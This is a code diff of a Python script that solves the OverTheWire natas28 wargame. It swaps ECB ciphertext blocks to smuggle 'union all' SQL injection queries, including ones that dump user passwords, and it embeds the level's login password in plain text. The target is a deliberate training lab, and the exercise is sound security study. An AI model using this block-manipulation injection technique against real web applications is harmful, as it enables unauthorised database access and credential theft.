@@ -4,75 +4,79 @@ from urllib.parse import unquote, quote
 import binascii
 import re
 
-def string_to_hex(s):
-    return ''.join(format(ord(char), '02x') for char in s)
-
-# def check_session(i):
+# === CONFIGURATION ===
 URL = "http://natas28.natas.labs.overthewire.org"
-auth_username = "natas28"
-auth_password = "1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj"
-headers = {"authorization": 'Basic {0}'.format(base64.b64encode((auth_username + ':' + auth_password).encode('utf8')).decode())}
-data = {'query':''}
+USERNAME = "natas28"
+PASSWORD = "1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj"
+HEADERS = {
+    "Authorization": "Basic " + base64.b64encode(f"{USERNAME}:{PASSWORD}".encode()).decode()
+}
 
+# === HELPER FUNCTIONS ===
+def get_encrypted_param(query):
+    data = {'query': query}
+    response = requests.post(URL, data=data, headers=HEADERS, allow_redirects=False)
+    location = response.headers.get('Location')
+    if not location:
+        print("[!] No redirect location found!")
+        return None
+    encoded_param = location.split('=')[1]
+    return encoded_param
 
-# first get the fake line, for afterwards
-data['query'] = '111222333'
-response = requests.post(URL,data=data, headers=headers, allow_redirects=False)
-param = response.headers.get('Location').split('=')[1]
-# # Decode the `param`, convert to hex, and format with newlines every 16 bytes
-decoded_hex = binascii.hexlify(base64.b64decode(unquote(param))).decode()
-formatted_output = [decoded_hex[i:i+32] for i in range(0, len(decoded_hex), 32)]
-# print('\n'.join(formatted_output) + '\n')
+def decode_to_blocks(encoded_param):
+    decoded = base64.b64decode(unquote(encoded_param))
+    hex_data = binascii.hexlify(decoded).decode()
+    blocks = [hex_data[i:i+32] for i in range(0, len(hex_data), 32)]
+    return blocks
 
-fake_line = formatted_output[2]
+def reencode_blocks(blocks):
+    joined_hex = ''.join(blocks)
+    raw_bytes = binascii.unhexlify(joined_hex)
+    return quote(base64.b64encode(raw_bytes))
 
-while True:
-        
-    # now, get almost final query
-    payload = 'union all ' + input("give me sql query: ")
-    data['query'] = "111222333' {};#".format(payload)
+def extract_results(html_response):
+    return re.findall(r'<li>(.*?)</li>', html_response)
 
-    response = requests.post(URL,data=data, headers=headers, allow_redirects=False)
-    param = response.headers.get('Location').split('=')[1]
+# === MAIN LOGIC ===
+def main():
+    # Step 1: Get baseline encrypted blocks to reuse the third block
+    baseline_param = get_encrypted_param("111222333")
+    if not baseline_param:
+        return
+    baseline_blocks = decode_to_blocks(baseline_param)
+    fake_block = baseline_blocks[2]
 
-    # # Decode the `param`, convert to hex, and format with newlines every 16 bytes
-    decoded_hex = binascii.hexlify(base64.b64decode(unquote(param))).decode()
-    formatted_output = [decoded_hex[i:i+32] for i in range(0, len(decoded_hex), 32)]
-    # insert the fake line
-    formatted_output[2] = fake_line
-    # print('\n'.join(formatted_output))
-    # from hex to binary, from there to base64, and finally to url-encode
-    encoded_hex = binascii.unhexlify(''.join(formatted_output))
-    # print(encoded_hex)
-    url_encoded_output = quote(base64.b64encode(encoded_hex))
-    # print(url_encoded_output)
-    # print(formatted_output, encoded_hex, url_encoded_output)
-    response = requests.get(URL+'/search.php?query=' + url_encoded_output, headers=headers)
+    print("[+] Ready for input. Type 'exit' to quit.\n")
 
-    print('\n'.join(re.findall(r'<li>(.*)</li>', response.text)))
+    while True:
+        user_input = input("Enter SQL query (without 'union all'): ").strip()
+        if user_input.lower() == 'exit':
+            break
 
-# # for i in range(100):
-# #     data['query'] += 'D'
-# #     # cookies = {'PHPSESSID': '123'}
+        # Construct the payload and get the encrypted response
+        payload = f"111222333' union all {user_input};#"
+        encrypted_param = get_encrypted_param(payload)
+        if not encrypted_param:
+            continue
 
-# #     response = requests.post(URL,data=data, headers=headers, allow_redirects=False)
-# #     # Check if there's a redirect
-# #     # if response.status_code in (301, 302):  # Common status codes for redirects
-# #     param = response.headers.get('Location').split('=')[1]
-# #     # Decode the `param`, convert to hex, and format with newlines every 16 bytes
-# #     decoded_hex = binascii.hexlify(base64.b64decode(unquote(param))).decode()
-# #     formatted_output = '\n'.join([decoded_hex[i:i+32] for i in range(0, len(decoded_hex), 32)])
+        blocks = decode_to_blocks(encrypted_param)
+        if len(blocks) < 3:
+            print("[!] Not enough blocks in response.")
+            continue
 
-# #     print('D x ' + str(len(data['query'])))
-# #     print(formatted_output+'\n')
+        blocks[2] = fake_block  # Insert fake block to avoid hash mismatch
+        final_encoded_param = reencode_blocks(blocks)
 
+        # Send GET request with manipulated param
+        response = requests.get(f"{URL}/search.php/?query={final_encoded_param}", headers=HEADERS)
+        results = extract_results(response.text)
 
-'''
-select database()
+        if results:
+            print("[+] Query Results:")
+            for r in results:
+                print("  -", r)
+        else:
+            print("[-] No results or error.")
 
-select table_name from information_schema.tables where table_schema=0x6E617461733238
-
-select column_name from information_schema.columns where table_name=0x7573657273
-
-select password from users
-'''
+if __name__ == "__main__":
+    main()
